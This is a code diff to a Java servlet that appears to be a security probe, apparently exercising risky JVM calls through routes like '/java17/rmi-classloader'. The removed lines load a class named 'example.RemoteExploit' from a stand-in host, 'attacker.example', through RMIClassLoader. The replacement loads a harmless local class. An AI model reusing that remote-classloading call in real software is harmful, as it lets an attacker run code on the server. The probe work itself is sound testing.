@@ -184,12 +184,12 @@ public final class Java17ProbeServlet extends HttpServlet {
     }
     if ("/java17/rmi-classloader".equals(path)) {
       try {
-        RMIClassLoader.loadClass("http://attacker.example/Exploit", "example.RemoteExploit");
-      } catch (ClassNotFoundException expected) {
-        send(response, "java17 rmi classloader attempted");
-        return;
+        Class<?> type = RMIClassLoader.loadClass(
+            "https://reports.invalid/catalog/", "java.lang.String", Java17ProbeServlet.class.getClassLoader());
+        send(response, "local-rmi-class=" + type.getName());
+      } catch (ClassNotFoundException e) {
+        throw new ServletException(e);
       }
-      send(response, "java17 rmi classloader completed");
       return;
     }
     if ("/java17/jdbc-h2".equals(path)) {
